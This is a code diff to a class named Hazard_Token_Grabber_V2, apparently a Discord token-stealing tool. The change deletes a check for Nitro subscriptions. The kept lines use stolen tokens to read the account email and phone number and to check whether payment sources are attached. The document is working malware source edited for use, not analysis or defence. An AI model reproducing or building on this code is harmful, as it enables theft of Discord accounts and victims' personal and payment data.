@@ -348,12 +348,6 @@ class Hazard_Token_Grabber_V2:
             email = j["email"]
             phone = j["phone"] if j["phone"] else "No Phone Number attached"
             try:
-                nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
-            except Exception:
-                pass
-            has_nitro = False
-            has_nitro = bool(len(nitro_data) > 0)
-            try:
                 billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
             except Exception:
                 pass
